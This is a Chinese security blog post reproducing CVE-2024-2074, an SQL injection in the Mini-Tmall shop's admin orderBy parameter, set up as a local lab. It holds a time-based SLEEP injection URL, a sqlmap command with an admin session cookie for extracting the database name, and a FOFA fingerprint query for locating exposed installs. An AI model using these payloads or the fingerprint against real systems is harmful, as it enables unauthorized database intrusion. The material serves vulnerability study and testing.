#  【漏洞复现】CVE-2024-2074   
原创 fgz  AI与网安   2024-03-07 07:01  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
Mini-Tmall SQL注入漏洞  
  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
<=  
20231017版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM3pibRGicmCE9RFo6DD4rmjIUUWeQU7vtJOuRGW0ewqK8tyiartVnTtibBZfAKfhP1J4k2o5xCnMkKDQ/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞描述  
  
  
Mini-Tmall是一个  
基于Spring Boot的迷你天猫商城。  
Mini-Tmall在20231017版本及之前存在一个严重的漏洞，攻击者可以利用该漏洞通过远程执行特定操作来注入恶意SQL语句，从而获取敏感信息或控制数据库。此漏洞影响文件?r=tmall/admin/user/1/1的一些未知处理，攻击者可以通过篡改orderBy参数来达成sql注入攻击。攻击者可以通过远程方式发起攻击。  
  
  
04  
  
—  
  
环境搭建  
  
  
  
1.项目使用IntelliJ IDEA开发，请使用IntelliJ IDEA的版本控制检出功能，输入“https://gitee.com/project_team/Tmall_demo.git”拉取项目即可。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMXmRL3cEibribSOnqEU8hoicj8qLJnMF2KFZ0YcGF0f9K0CefTbVuUibveunkHsUkBjEbwoficiabuTv6A/640?wx_fmt=png&from=appmsg "")  
  
  
2.项目数据库为MySQL 5.7版本，在sqls文件夹中找到SQL文件并导入到数据库中。直接运行脚本即可，会自动创建库和表  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMXmRL3cEibribSOnqEU8hoicj2ZicUFnX6ebCcagEhA9OYakP50C7Nq7gmvczOm5L4W3ibnHty0ECrdbQ/640?wx_fmt=png&from=appmsg "")  
  
  
3.使用IDEA打开项目后，在maven面板刷新项目，下载依赖包。然后修改下数据库密码信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMXmRL3cEibribSOnqEU8hoicjhhsLbunG58WaFadIGuzIslUByqib0Ouo9Nnk0ia617FxW3OGFHLYBXbw/640?wx_fmt=png&from=appmsg "")  
  
  
4.配置数据库连接并启动SpringBootApplication即可。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMXmRL3cEibribSOnqEU8hoicjcFhQxtNFQzd7gtia1Y7eklCSjRtgg8CWTaNGCA0BCVbeZUDaSOyY1TQ/640?wx_fmt=png&from=appmsg "")  
  
  
前台地址：http://localhost:8080/tmall  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM3pibRGicmCE9RFo6DD4rmjI0Q3zfffcicl0tmZbJjPqSiav59y9hFkuVstZrwz0Sg5E1X2MbqyOIaUA/640?wx_fmt=png&from=appmsg "")  
  
  
  
后台地址：http://localhost:8080/tmall/admin  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM3pibRGicmCE9RFo6DD4rmjI9VNGPSbcF160dAJMwKqRY3FSEQKIpW77VdOWJzyiba3avHnPcibXu3Rw/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
FOFA搜索语句  
  
  
```
icon_hash="-2087517259"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM3pibRGicmCE9RFo6DD4rmjIWnxNOF20n6SvKftpZzw5Sl7QdOcRWGoxofV9iafOTC92ImZOCG27tYg/640?wx_fmt=png&from=appmsg "")  
  
我这个语法搜到的比较少，谁有更好的语法可以私信我一下  
  
  
06  
  
—  
  
漏洞复现  
  
  
POC：  
```
http://localhost:8080/tmall/admin/user/1/1?orderBy=7,if((length(database())=11),SLEEP(3),0)
```  
  
登录后在浏览器访问上面的url会延迟3秒，表示存在漏洞。  
  
这个漏洞先需要登录后台拿到cookie  
  
使用sqlmap跑一下，获取当前数据库名称  
```
sqlmap -u http://localhost:8080/tmall/admin/user/1/1?orderBy=* --level=5 --current-db --cookie="username=admin; JSESSIONID=56AEDFB42C10096BD3E6CD80398EC94C"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM3pibRGicmCE9RFo6DD4rmjIiayqQn5UO5lDhN5RTRtibxNIia76W4HMXMWlQPb37uYyiaLoJM6PZLmChw/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现成功  
  
  
因为需要登录，就不写nuclei POC了  
  
  
  
07  
  
—  
  
修复建议  
  
  
升级到最新版本。  
  
  
08  
  
—  
  
新粉丝福利领取  
  
  
在公众号主页或者文章末尾点击发送消息免费领取。  
  
发送【  
电子书】关键字获取电子书  
  
发送【  
POC】关键字获取POC  
  
发送【  
工具】获取渗透工具包  
  
  
